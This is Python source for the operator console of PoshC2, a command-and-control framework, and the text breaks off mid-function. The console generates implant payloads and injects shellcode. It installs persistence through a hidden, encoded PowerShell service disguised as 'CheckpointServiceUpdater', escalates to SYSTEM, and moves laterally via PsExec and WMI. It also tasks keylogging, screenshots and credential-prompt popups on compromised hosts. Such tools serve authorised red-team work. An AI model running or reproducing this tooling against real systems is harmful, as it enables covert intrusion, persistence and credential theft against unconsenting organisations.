#!/usr/bin/python
 
import os, time, readline, base64, re, traceback, glob, sys, argparse, shlex, signal, subprocess
import datetime
from datetime import datetime, timedelta
from sqlite3 import Error
from Help import *
from AutoLoads import *
from DB import *
from Colours import *
from Config import *
from HTML import *
from TabComplete import *
from Payloads import *
from Core import *

def catch_exit(signum, frame):
  sys.exit(0)

def createproxypayload():
  proxyuser = raw_input("Proxy User: e.g. Domain\\user ")
  proxypass = raw_input("Proxy Password: e.g. Password1 ")
  proxyurl = raw_input("Proxy URL: .e.g. http://10.150.10.1:8080 ")
  credsexpire = raw_input("Password/Account Expiration Date: .e.g. 15/03/2018 ")
  update_item("ProxyURL", "C2Server", proxyurl)
  update_item("ProxyUser", "C2Server", proxyuser)
  update_item("ProxyPass", "C2Server", proxypass)
  C2 = get_c2server_all()
  newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
    C2[13], C2[11], "", "", C2[19], C2[20],
    C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
  newPayload.CreateRaw("Proxy")
  newPayload.CreateDlls("Proxy")
  newPayload.CreateShellcode("Proxy")
  newPayload.CreateEXE("Proxy")
  newPayload.CreateMsbuild("Proxy")
  new_urldetails( "Proxy", C2[1], C2[3], proxyurl, proxyuser, proxypass, credsexpire )
  startup("Created new proxy payloads")

def createdaisypayload():
  name = raw_input("Daisy name: e.g. DC1 ")
  domain = raw_input("Domain or URL: https://www.example.com ")
  daisyurl = raw_input("Daisy host: .e.g. http://10.150.10.1 ")
  daisyport = raw_input("Daisy port: .e.g. 8888 ")
  daisyhostid = raw_input("Select Daisy Implant Host: e.g. 5 ")
  daisyhost = get_implantbyid(daisyhostid)
  proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
  C2 = get_c2server_all()
  newPayload = Payloads(C2[5], C2[2], daisyurl, "", daisyport, "", "", "",
    "", proxynone, C2[19], C2[20],
    C2[21], "%s?d" % get_newimplanturl(), PayloadsDirectory)
  newPayload.C2Core = (newPayload.C2Core).replace("$pid;%s" % (daisyurl+":"+daisyport),"$pid;%s@%s" % (daisyhost[11],daisyhost[3]))
  newPayload.CreateRaw(name)
  newPayload.CreateDlls(name)
  newPayload.CreateShellcode(name)
  newPayload.CreateEXE(name)
  newPayload.CreateMsbuild(name)
  new_urldetails( name, C2[1], C2[3], domain, daisyurl, daisyhostid, "" )
  startup("Created new %s daisy payloads" % name)

def createnewpayload():
  domain = raw_input("Domain or URL: https://www.example.com ")
  domainbase = (domain.lower()).replace('https://','')
  domainbase = domainbase.replace('http://','')
  domainfront = raw_input("Domain front URL: e.g. fjdsklfjdskl.cloudfront.net ")
  proxyurl = raw_input("Proxy URL: .e.g. http://10.150.10.1:8080 ")
  randomid = randomuri(5)
  proxyuser = ""
  proxypass = ""
  credsexpire = ""
  if proxyurl:
    proxyuser = raw_input("Proxy User: e.g. Domain\\user ")
    proxypass = raw_input("Proxy Password: e.g. Password1 ")
    credsexpire = raw_input("Password/Account Expiration Date: .e.g. 15/03/2018 ")
    imurl = "%s?p" % get_newimplanturl()
    domainbase = "Proxy%s%s" % (domainbase,randomid)
  else:
    domainbase = "%s%s" % (randomid,domainbase)
    imurl = get_newimplanturl()
  C2 = get_c2server_all()
  newPayload = Payloads(C2[5], C2[2], domain, domainfront, C2[8], proxyuser,
    proxypass, proxyurl, "", "", C2[19], C2[20],
    C2[21], imurl, PayloadsDirectory)
  newPayload.CreateRaw("%s_" % domainbase)
  newPayload.CreateDlls("%s_" % domainbase)
  newPayload.CreateShellcode("%s_" % domainbase)
  newPayload.CreateEXE("%s_" % domainbase)
  newPayload.CreateMsbuild("%s_" % domainbase)
  newPayload.CreatePython("%s_" % domainbase)
  new_urldetails( randomid, domain, domainfront, proxyurl, proxyuser, proxypass, credsexpire )
  startup("Created new payloads")

def argp(cmd):
  args = ""
  try:
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('-Help', '-help', '-h', action='store', dest='help', required=False)
    parser.add_argument('-Source', '-source', action='store', dest='source', required=True)
    parser.add_argument('-Destination', '-destination', action='store', dest='destination', required=True)
    parser.add_argument('-NotHidden', '-nothidden', action='store', dest='nothidden', required=False)
    args, unknown = parser.parse_known_args(shlex.split(cmd))
  except:
    error = "error"
  return args

def filecomplete(text, state):
  os.chdir(PayloadsDirectory)
  return (glob.glob(text+'*')+[None])[state]

def readfile_with_completion(message):
  readline.set_completer(filecomplete)
  path = raw_input(message)
  t = tabCompleter()
  t.createListCompleter(COMMANDS)
  readline.set_completer(t.listCompleter)
  return path

def complete(text, state):
  for cmd in COMMANDS:
    if cmd.startswith(text):
      if not state:
        return cmd
      else:
        state -= 1

def load_file( location ):
  fr = None
  try:
    file = open((location), "rb")
    fr = file.read()
  except Exception as e:
    print ("Error loading file %s" % e)
  
  if fr:
    return fr
  else:
    return None

def migrate(randomuri, params=""):
  implant = get_implantdetails(randomuri)
  implant_arch = implant[10]
  implant_comms = implant[15]

  if implant_arch == "AMD64":
    arch = "64"
  else:
    arch = "86"

  if implant_comms == "Normal":
    shellcodefile = load_file("%s/payloads/Posh-shellcode_x%s.bin" % (ROOTDIR,arch))
  elif implant_comms == "Daisy":
    daisyname = raw_input("Name required: ")
    shellcodefile = load_file("%s/payloads/%sPosh-shellcode_x%s.bin" % (ROOTDIR,daisyname,arch))
  elif implant_comms == "Proxy":
    shellcodefile = load_file("%s/payloads/ProxyPosh-shellcode_x%s.bin" % (ROOTDIR,arch))

  check_module_loaded("Inject-Shellcode.ps1", randomuri)
  new_task("$Shellcode%s=\"%s\"" % (arch,base64.b64encode(shellcodefile)), randomuri)
  new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), randomuri)

def startup(printhelp = ""):
  try:
    if os.name == 'nt':
      os.system('cls')
    else:
      os.system('clear')
  except Exception as e:
    print ("cls")
    print (chr(27) + "[2J")
  print (Colours.GREEN + "")
  print (logopic)
  print (Colours.END + "")

  try:
    ii = get_implants()
    if ii:
      for i in ii:
        ID = i[0]
        RandomURI = i[1]
        LastSeen = i[7]
        Hostname = i[3]
        DomainUser = i[2]
        Arch = i[10]
        PID = i[8]
        Pivot = i[15]
        Sleep = i[13]
        Label = i[16]
        if Pivot == "Daisy": Pivot = "D"
        elif Pivot == "C#": Pivot = "C#"
        elif Pivot == "Proxy": Pivot = "P"
        elif Pivot == "Python": Pivot = "PY"
        elif Pivot == "OSX": Pivot = "PY"
        else: Pivot = "PS"

        from datetime import datetime, timedelta
        LastSeenTime = datetime.strptime(LastSeen,"%m/%d/%Y %H:%M:%S")
        now = datetime.now()
        nowplus10 = now - timedelta(minutes=10)
        nowplus60 = now - timedelta(minutes=59)
        sID = "["+str(ID)+"]"
        if Label == None:
          sLabel = ""
        else:
          sLabel = "["+Label+"]"
        if nowplus60 > LastSeenTime:
          print (Colours.RED + "%s%s: Seen:%s | PID:%s | %s | %s @ %s (%s) %s" % (sID.ljust(4), sLabel, LastSeen, PID.ljust(5), Sleep, DomainUser, Hostname, Arch, Pivot))
        elif nowplus10 > LastSeenTime:
          print (Colours.YELLOW + "%s%s: Seen:%s | PID:%s | %s | %s @ %s (%s) %s" % (sID.ljust(4), sLabel, LastSeen, PID.ljust(5), Sleep, DomainUser, Hostname, Arch, Pivot))
        else:
          print (Colours.GREEN + "%s%s: Seen:%s | PID:%s | %s | %s @ %s (%s) %s" % (sID.ljust(4), sLabel, LastSeen, PID.ljust(5), Sleep, DomainUser, Hostname, Arch, Pivot))
    else:
      from datetime import datetime, timedelta
      now = datetime.now()
      print (Colours.RED+"No Implants as of: %s" % now.strftime("%m/%d/%Y %H:%M:%S"))
    print (Colours.END+"")
    if printhelp:
      print (printhelp)

    t = tabCompleter()
    t.createListCompleter(PRECOMMANDS)
    readline.set_completer_delims('\t')
    readline.parse_and_bind("tab: complete")
    readline.set_completer(t.listCompleter)
    history = get_history_dict()
    if history:
      for command in history:
        try:
          readline.add_history(command[1])
        except:
          pass

    implant_id = raw_input("Select ImplantID or ALL or Comma Separated List (Enter to refresh):: ")
    print ("")

    if implant_id:
      try:
        last = get_lastcommand()
        if last:
          if last != implant_id:
            new_commandhistory(implant_id)
        else:
          new_commandhistory(implant_id)
      except Exception as e:
        ExError = e

    if (implant_id == "") or (implant_id.lower() == "back") or (implant_id.lower() == "clear"):
      startup()

    if "output-to-html" in implant_id.lower():
      generate_table("CompletedTasks")
      generate_table("C2Server")
      generate_table("Creds")
      generate_table("Implants")
      graphviz()
      time.sleep(1)
      startup()
    if ("show-urls" in implant_id.lower()) or ("list-urls" in implant_id.lower()):
      urls = get_c2urls()
      urlformatted = "RandomID  URL  HostHeader  ProxyURL  ProxyUsername  ProxyPassword  CredentialExpiry\n"
      for i in urls:
        urlformatted += "%s  %s  %s  %s  %s  %s  %s  %s \n" % (i[0],i[1],i[2],i[3],i[4],i[5],i[6],i[7])
      startup(urlformatted)
    if "add-autorun" in implant_id.lower():
      autorun = (implant_id.lower()).replace("add-autorun ","")
      autorun = autorun.replace("add-autorun","")
      add_autorun(autorun)
      startup("add-autorun: %s\r\n" % autorun)
    if "list-autorun" in implant_id.lower():
      autoruns = get_autorun()
      startup(autoruns)
    if "del-autorun" in implant_id.lower():
      autorun = (implant_id.lower()).replace("del-autorun ","")
      del_autorun(autorun)
      startup("deleted autorun\r\n")
    if "nuke-autorun" in implant_id.lower():
      del_autoruns()
      startup("nuked autoruns\r\n")
    if (implant_id.lower() == "automigrate-frompowershell") or (implant_id.lower() == "am"):
      startup("automigrate not currently implemented for the Python version of PoshC2\r\n")
    if "show-serverinfo" in implant_id.lower():
      i = get_c2server_all()
      detailsformatted = "\nHostnameIP: %s\nEncKey: %s\nDomainFrontHeader: %s\nDefaultSleep: %s\nKillDate: %s\nHTTPResponse: %s\nFolderPath: %s\nServerPort: %s\nQuickCommand: %s\nDefaultProxyURL: %s\nDefaultProxyUser: %s\nDefaultProxyPass: %s\nEnableSounds: %s\nAPIKEY: %s\nMobileNumber: %s\nURLS: %s\n%sSocksURLS: %s\nInsecure: %s\nUserAgent: %s\nReferer: %s\nAPIToken: %s\nAPIUser: %s\nEnableNotifications: %s" % (i[1],i[2],i[3],i[4],i[5],i[6],i[7],i[8],i[9],i[10],i[11],i[12],i[13],i[14],i[15],i[16],i[17],i[18],i[19],i[20],i[21],i[22],i[23],i[24])
      startup(detailsformatted)
    if "turnoff-notifications" in implant_id.lower():
      update_item("EnableNotifications", "C2Server", "No")
      startup("Turned off notifications on new implant")
    if "turnon-notifications" in implant_id.lower():
      update_item("EnableNotifications", "C2Server", "Yes")
      startup("Turned on notifications on new implant")
    if "set-clockworksmsapikey" in implant_id.lower():
      cmd = (implant_id.lower()).replace("set-clockworksmsapikey ","")
      cmd = cmd.replace("set-clockworksmsapikey","")
      update_item("MobileNumber", "C2Server", cmd)
      startup("Updated set-clockworksmsapikey: %s\r\n" % cmd)
    if "set-clockworksmsnumber" in implant_id.lower():
      cmd = (implant_id.lower()).replace("set-clockworksmsnumber ","")
      cmd = cmd.replace("set-clockworksmsnumber","")
      update_item("APIKEY", "C2Server", cmd)
      startup("Updated set-clockworksmsnumber (Restart C2 Server): %s\r\n" % cmd)
    if "set-defaultbeacon" in implant_id.lower():
      cmd = (implant_id.lower()).replace("set-defaultbeacon ","")
      cmd = cmd.replace("set-defaultbeacon","")
      update_item("DefaultSleep", "C2Server", cmd)
      startup("Updated set-defaultbeacon (Restart C2 Server): %s\r\n" % cmd)
    if "opsec" in implant_id.lower():
      implants = get_implants_all()
      comtasks = get_completedtasks()
      hosts = ""
      uploads = ""
      urls = ""
      users = ""
      for i in implants:
        if i[3] not in hosts:
          hosts += "%s \n" % i[3]
        if i[9] not in urls:
          urls += "%s \n" % i[9]
      for t in comtasks:
        hostname = get_implantdetails(t[2])
        if hostname[2] not in users:
          users += "%s \n" % hostname[2]
        if "Upload-File" in t[3]:
          uploadedfile = t[3]
          uploadedfile = uploadedfile.partition("estination ")[2]
          uploadedfile = uploadedfile.partition(" -Base64")[0]
          uploads += "%s %s \n" % (hostname[3], uploadedfile)
        if "Installing persistence" in t[4]:
          hostname = get_implantdetails(t[2])
          line = t[4].replace('\n','')
          line = line.replace('\r','')
          filenameuploaded = line.rstrip().split(":",1)[1]
          uploads += "%s %s \n" % (hostname[3], filenameuploaded)
      startup("Users Compromised: \n%s\nHosts Compromised: \n%s\nURLs: \n%s\nFiles Uploaded: \n%s" % (users, hosts, urls, uploads))
    if "listmodules" in implant_id.lower():
      mods = ""
      for modname in os.listdir("%s/Modules/" % POSHDIR):
        mods += "%s\r\n" % modname
      startup(mods)
    if "creds" in implant_id.lower():
      startup("creds module not implemented yet")

    if (implant_id.lower() == "pwnself" ) or (implant_id.lower() == "p"):
      subprocess.Popen(["python", "%s%s" % (PayloadsDirectory, "py_dropper.py")])
      startup()

    if (implant_id.lower() == "tasks" ) or (implant_id.lower() == "tasks "):
      alltasks = ""
      tasks = get_nettasks_all()
      if tasks is None:
        startup("No tasks queued!\r\n")
      else:
        for task in tasks:
          imname = get_implantdetails(task[1])
          alltasks += "(%s) %s\r\n" % ("%s" % (imname[11]),task[2])
        startup("Queued tasks:\r\n\r\n%s" % alltasks)

    if (implant_id.lower() == "cleartasks" ) or (implant_id.lower() == "cleartasks "):
      drop_nettasks()
      startup("Empty tasks queue\r\n")

    if "quit" in implant_id.lower():
      ri = raw_input("Are you sure you want to quit? (Y/n) ")
      if ri.lower() == "n":
        startup()
      if ri == "":
        sys.exit(0)
      if ri.lower() == "y":
        sys.exit(0)
    
    if "createdaisypayload" in implant_id.lower():
      createdaisypayload()

    if "createproxypayload" in implant_id.lower():
      createproxypayload()

    if "createnewpayload" in implant_id.lower():
      createnewpayload()

    if (implant_id == "?") or (implant_id == "help"):
      startup(pre_help)
    
    if (implant_id.lower() == "history") or implant_id.lower() == "history ":
      startup(get_history())

    if "use " in implant_id.lower():
      implant_id = implant_id.replace("use ","")
      params = re.compile("use ", re.IGNORECASE)
      implant_id = params.sub("", implant_id)

    commandloop(implant_id)
  except Exception as e:
    if 'unable to open database file' in e:
      startup()
    else:
      traceback.print_exc()
      print ("Error: %s" % e)
      print ("Currently no valid implants: sleeping for 10 seconds")
      time.sleep(10)
      startup()

def runcommand(command, randomuri):
  if command:
    try:
      last = get_lastcommand()
      if last:
        if last != command:
          new_commandhistory(command)
      else:
        new_commandhistory(command)
    except Exception as e:
      ExError = e

  implant_type = get_implanttype(randomuri)
  if implant_type == "OSX":
    if 'beacon' in command.lower() or 'set-beacon' in command.lower() or 'setbeacon' in command.lower():
      command = command.replace('set-beacon ', '')
      command = command.replace('setbeacon ', '')
      command = command.replace('beacon ', '')
      try:
        if "s" in command:
          command = command.replace('s', '')
        if "h" in command:
          command = command.replace('h', '')
          command = (int(command)) * 60
          command = (int(command)) * 60
        if "m" in command:
          command = command.replace('m', '')
          command = (int(command)) * 60
      except Exception as e:
        print ("Error setting beacon: %s" % e)

      sleep = '$sleeptime = %s' % command
      update_sleep(command, randomuri)
      new_task(sleep, randomuri)

    elif (command.lower().startswith('label-implant')):
        label = command.replace('label-implant ', '')
        update_label(label, randomuri)
        startup()

    elif "searchhelp" in command.lower():
      searchterm = (command.lower()).replace("searchhelp ","")
      import string
      helpfull = string.split(py_help1, '\n')
      for line in helpfull:
        if searchterm in line:
          print (line)
    
    elif "unhide-implant" in command.lower():
      unhide_implant(randomuri)

    elif "hide-implant" in command.lower():
      kill_implant(randomuri)

    elif command.lower() == 'sai' or command.lower() == 'sai ':
      new_task('startanotherimplant', randomuri)

    elif "upload-file" in command.lower():
      source = ""
      destination = ""
      s = ""
      if command.strip().lower() == "upload-file":
        source = readfile_with_completion("Location of file to upload: ")
        while not os.path.isfile(source):
          print("File does not exist: %s" % source)
          source = readfile_with_completion("Location of file to upload: ")
        destination = raw_input("Location to upload to: ")
      else:
        args = argp(command)
        source = args.source
        destination = args.destination
      try:
        with open(source, "rb") as source_file:
          s = source_file.read()
        if s:
          sourceb64 = base64.b64encode(s)
          destination = destination.replace("\\","\\\\")
          print ("")
          print ("Uploading %s to %s" % (source, destination))
          uploadcommand = "upload-file \"%s\":%s" % (destination, sourceb64)
          new_task(uploadcommand, randomuri)
        else:
          print("Source file could not be read or was empty")
      except Exception as e:
        print ("Error with source file: %s" % e   )
        traceback.print_exc()

    elif command.lower() == "help" or command == "?" or command.lower() == "help ":
      print (py_help1)

    elif "loadmoduleforce" in command.lower():
      params = re.compile("loadmoduleforce ", re.IGNORECASE)
      params = params.sub("", command)
      check_module_loaded(params, randomuri, force=True)

    elif "loadmodule" in command.lower():
      params = re.compile("loadmodule ", re.IGNORECASE)
      params = params.sub("", command)
      check_module_loaded(params, randomuri)

    elif 'get-screenshot' in command.lower():
      taskcmd = "screencapture -x /tmp/s;base64 /tmp/s;rm /tmp/s"
      new_task(taskcmd, randomuri)

    elif "kill-implant" in command.lower() or "exit" in command.lower():
      impid = get_implantdetails(randomuri)
      ri = raw_input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
      if ri.lower() == "n":
        print ("Implant not terminated")
      if ri == "":
        pid = get_pid(randomuri)
        new_task("kill -9 %s" % pid,randomuri)
        kill_implant(randomuri)
      if ri.lower() == "y":
        pid = get_pid(randomuri)
        new_task("kill -9 %s" % pid,randomuri)
        kill_implant(randomuri)

    elif (command == "back") or (command == "clear") or (command == "back ") or (command == "clear "):
      startup()

    else:
      if command:
        new_task(command, randomuri)
      return

  elif implant_type == "C#":
      try:
        check_module_loaded("Core.exe", randomuri)
      except Exception as e:
        print ("Error loading Core.exe: %s" % e)
        
      if "searchhelp" in command.lower():
        searchterm = (command.lower()).replace("searchhelp ","")
        import string
        helpfull = string.split(sharp_help1, '\n')
        for line in helpfull:
          if searchterm in line:
            print (line)

      elif "upload-file" in command.lower():
        source = ""
        destination = ""
        s = ""
        if command.strip().lower() == "upload-file":
          source = readfile_with_completion("Location of file to upload: ")
          while not os.path.isfile(source):
            print("File does not exist: %s" % source)
            source = readfile_with_completion("Location of file to upload: ")
          destination = raw_input("Location to upload to: ")
        else:
          args = argp(command)
          source = args.source
          destination = args.destination
        try:
          with open(source, "rb") as source_file:
            s = source_file.read()
          if s:
            sourceb64 = base64.b64encode(s)
            destination = destination.replace("\\","\\\\")
            print ("")
            print ("Uploading %s to %s" % (source, destination))
            uploadcommand = "upload-file%s;\"%s\"" % (sourceb64, destination)
            new_task(uploadcommand, randomuri)
          else:
            print("Source file could not be read or was empty")
        except Exception as e:
          print ("Error with source file: %s" % e   )
          traceback.print_exc()

      elif "unhide-implant" in command.lower():
        unhide_implant(randomuri)

      elif "hide-implant" in command.lower():
        kill_implant(randomuri)

      elif "inject-shellcode" in command.lower():
        params = re.compile("inject-shellcode", re.IGNORECASE)
        params = params.sub("", command)
        path = readfile_with_completion("Location of shellcode file: ")
        try:
          shellcodefile = load_file(path)
          if shellcodefile != None:
            arch = "64"
            new_task("run-exe Core.Program Core Inject-Shellcode %s%s" % (base64.b64encode(shellcodefile),params), randomuri)
        except Exception as e:
          print ("Error loading file: %s" % e)

      elif "kill-implant" in command.lower() or "exit" in command.lower():
        impid = get_implantdetails(randomuri)
        ri = raw_input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
        if ri.lower() == "n":
          print ("Implant not terminated")
        if ri == "":
          new_task("exit",randomuri)
          kill_implant(randomuri)
        if ri.lower() == "y":
          new_task("exit",randomuri)
          kill_implant(randomuri)
    
      elif "seatbelt " in command.lower():
        check_module_loaded("Seatbelt.exe", randomuri)
        new_task(command,randomuri)

      elif (command.lower().startswith("stop-keystrokes")):
        new_task("run-exe Core.Program Core %s" % command,randomuri)
        
      elif (command.lower().startswith("get-keystrokes")):
        new_task("run-exe Core.Program Core %s" % command,randomuri)

      elif (command.lower().startswith("get-screenshotmulti")):
        new_task(command,randomuri)

      elif (command.lower().startswith("get-screenshot")):
        new_task("run-exe Core.Program Core %s" % command,randomuri)
        
      elif (command.lower().startswith("arpscan")):
        new_task("run-exe Core.Program Core %s" % command,randomuri)
  
      elif (command.lower().startswith("testadcredential")):
        new_task("run-exe Core.Program Core %s" % command,randomuri)
          
      elif (command.lower().startswith("testlocalcredential")):
        new_task("run-exe Core.Program Core %s" % command,randomuri)

      elif (command.lower().startswith("turtle")):
        new_task("run-exe Core.Program Core %s" % command,randomuri)
        
      elif (command.lower().startswith("get-userinfo")):
        new_task("run-exe Core.Program Core %s" % command,randomuri)
                    
      elif (command.lower().startswith("get-content")):
        new_task("run-exe Core.Program Core %s" % command,randomuri)
                    
      elif (command.lower().startswith("resolvednsname")):
        new_task("run-exe Core.Program Core %s" % command,randomuri)
          
      elif (command.lower().startswith("resolveip")):
        new_task("run-exe Core.Program Core %s" % command,randomuri)
                  
      elif (command.lower().startswith("cred-popper")):
        new_task("run-exe Core.Program Core %s" % command,randomuri)

      elif (command.lower().startswith("get-serviceperms")):
        new_task("run-exe Core.Program Core %s" % command,randomuri)

      elif (command.lower().startswith("move")):
        new_task("run-exe Core.Program Core %s" % command,randomuri)
        
      elif (command.lower().startswith("delete")):
        new_task("run-exe Core.Program Core %s" % command,randomuri)
      
      elif (command.lower().startswith("ls")):
        new_task("run-exe Core.Program Core %s" % command,randomuri)
                    
      elif (command.lower() == "pwd") or (command.lower() == "pwd "):
        new_task("run-exe Core.Program Core pwd",randomuri)
          
      elif (command.lower() == "ps") or (command.lower() == "ps "):
        new_task("run-exe Core.Program Core Get-ProcessList",randomuri)

      elif "loadmoduleforce" in command.lower():
        params = re.compile("loadmoduleforce ", re.IGNORECASE)
        params = params.sub("", command)
        check_module_loaded(params, randomuri, force=True)
  
      elif "loadmodule" in command.lower():
        params = re.compile("loadmodule ", re.IGNORECASE)
        params = params.sub("", command)
        check_module_loaded(params, randomuri)

      elif "listmodules" in command.lower():
        modules = os.listdir("%s/Modules/" % POSHDIR)
        print ("")
        print ("[+] Available modules:")
        print ("")
        for mod in modules:
          if (".exe" in mod) or (".dll" in mod) :
            print (mod)
        new_task(command,randomuri)
  
      elif "modulesloaded" in command.lower():
        ml = get_implantdetails(randomuri)
        print (ml[14])
      
      elif command.lower() == "help" or command == "?" or command.lower() == "help ":
        print (sharp_help1)
      
      elif (command == "back") or (command == "clear") or (command == "back ") or (command == "clear "):
        startup()
        
      elif ('beacon' in command.lower() and '-beacon' not in command.lower()) or 'set-beacon' in command.lower() or 'setbeacon' in command.lower():
        new_task(command, randomuri)
        command = command.replace('set-beacon ', '')
        command = command.replace('setbeacon ', '')
        command = command.replace('beacon ', '')
        update_sleep(command, randomuri)

      elif (command.lower().startswith('label-implant')):
        label = command.replace('label-implant ', '')
        update_label(label, randomuri)
        startup()
            
      else:
        if command:
          new_task(command, randomuri)
        return
      
  else:
    try:
      check_module_loaded("Implant-Core.ps1", randomuri)
    except Exception as e:
      print ("Error loading Implant-Core.ps1: %s" % e)

    run_autoloads(command, randomuri)

    if ('beacon' in command.lower() and '-beacon' not in command.lower()) or 'set-beacon' in command.lower() or 'setbeacon' in command.lower():
      new_task(command, randomuri)
      command = command.replace('set-beacon ', '')
      command = command.replace('setbeacon ', '')
      command = command.replace('beacon ', '')
      update_sleep(command, randomuri)

    elif (command.lower().startswith('label-implant')):
        label = command.replace('label-implant ', '')
        update_label(label, randomuri)
        startup()

    elif "searchhelp" in command.lower():
      searchterm = (command.lower()).replace("searchhelp ","")
      import string
      helpfull = string.split(posh_help, '\n')
      for line in helpfull:
        if searchterm in line:
          print (line)

    elif (command == "back") or (command == "clear") or (command == "back ") or (command == "clear "):
      startup()

    elif "install-servicelevel-persistencewithproxy" in command.lower():
      C2 = get_c2server_all()
      if C2[11] == "":
        startup("Need to run createproxypayload first")
      else:
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
            C2[13], C2[11], "", "", C2[19], C2[20],
            C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
        new_task(cmd, randomuri)

    elif "install-servicelevel-persistence" in command.lower():
      C2 = get_c2server_all()
      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
          "", "", "", "", C2[19], C2[20],
          C2[21], get_newimplanturl(), PayloadsDirectory)
      payload = newPayload.CreateRawBase()
      cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
      new_task(cmd, randomuri)
      
    elif "remove-servicelevel-persistence" in command.lower():
      new_task("sc.exe delete CPUpdater", randomuri)

    # psexec lateral movement
    elif "get-implantworkingdirectory" in command.lower():
      new_task("pwd", randomuri)
    
    elif "get-system-withproxy" in command.lower():
      C2 = get_c2server_all()
      if C2[11] == "":
        startup("Need to run createproxypayload first")
      else:
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
            C2[13], C2[11], "", "", C2[19], C2[20],
            C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        cmd =  "sc.exe create CPUpdaterMisc binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceModule start= auto" % payload
        new_task(cmd, randomuri)
        cmd =  "sc.exe start CPUpdaterMisc"
        new_task(cmd, randomuri)
        cmd =  "sc.exe delete CPUpdaterMisc"
        new_task(cmd, randomuri)

    elif "get-system-withdaisy" in command.lower():
      C2 = get_c2server_all()
      daisyname = raw_input("Payload name required: ")
      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
        with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
        cmd =  "sc.exe create CPUpdaterMisc binpath= 'cmd /c %s' Displayname= CheckpointServiceModule start= auto" % payload
        new_task(cmd, randomuri)
        cmd =  "sc.exe start CPUpdaterMisc"
        new_task(cmd, randomuri)
        cmd =  "sc.exe delete CPUpdaterMisc"
        new_task(cmd, randomuri)

    elif "get-system" in command.lower():
      C2 = get_c2server_all()
      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
          "", "", "", "", C2[19], C2[20],
          C2[21], get_newimplanturl(), PayloadsDirectory)
      payload = newPayload.CreateRawBase()
      cmd =  "sc.exe create CPUpdaterMisc binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceModule start= auto" % payload
      new_task(cmd, randomuri)
      cmd =  "sc.exe start CPUpdaterMisc"
      new_task(cmd, randomuri)
      cmd =  "sc.exe delete CPUpdaterMisc"
      new_task(cmd, randomuri)

    elif "quit" in command.lower():
      ri = raw_input("Are you sure you want to quit? (Y/n) ")
      if ri.lower() == "n":
        startup()
      if ri == "":
        sys.exit(0)
      if ri.lower() == "y":
        sys.exit(0)

    elif "invoke-psexecproxypayload" in command.lower():
      check_module_loaded("Invoke-PsExec.ps1", randomuri)
      C2 = get_c2server_all()
      if C2[11] == "":
        startup("Need to run createproxypayload first")
      else:
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
            C2[13], C2[11], "", "", C2[19], C2[20],
            C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        params = re.compile("invoke-psexecproxypayload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = "invoke-psexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params,payload)
        new_task(cmd, randomuri)

    elif "invoke-psexecdaisypayload" in command.lower():
      check_module_loaded("Invoke-PsExec.ps1", randomuri)
      daisyname = raw_input("Payload name required: ")
      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
        with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
        params = re.compile("invoke-psexecdaisypayload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = "invoke-psexec %s -command \"%s\"" % (params,payload)
        new_task(cmd, randomuri)
      else:
        startup("Need to run createdaisypayload first")

    elif "invoke-psexecpayload" in command.lower():
      check_module_loaded("Invoke-PsExec.ps1", randomuri)
      C2 = get_c2server_all()
      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
          "", "", "", "", C2[19], C2[20],
          C2[21], get_newimplanturl(), PayloadsDirectory)
      payload = newPayload.CreateRawBase()
      params = re.compile("invoke-psexecpayload ", re.IGNORECASE)
      params = params.sub("", command)
      cmd = "invoke-psexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params,payload)
      new_task(cmd, randomuri)
      
    # wmi lateral movement

    elif "invoke-wmiproxypayload" in command.lower():
      check_module_loaded("Invoke-WMIExec.ps1", randomuri)
      C2 = get_c2server_all()
      if C2[11] == "":
        startup("Need to run createproxypayload first")
      else:
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
            C2[13], C2[11], "", "", C2[19], C2[20],
            C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        params = re.compile("invoke-wmiproxypayload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = "invoke-wmiexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params,payload)
        new_task(cmd, randomuri)

    elif "invoke-wmidaisypayload" in command.lower():
      check_module_loaded("Invoke-WMIExec.ps1", randomuri)
      daisyname = raw_input("Name required: ")
      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
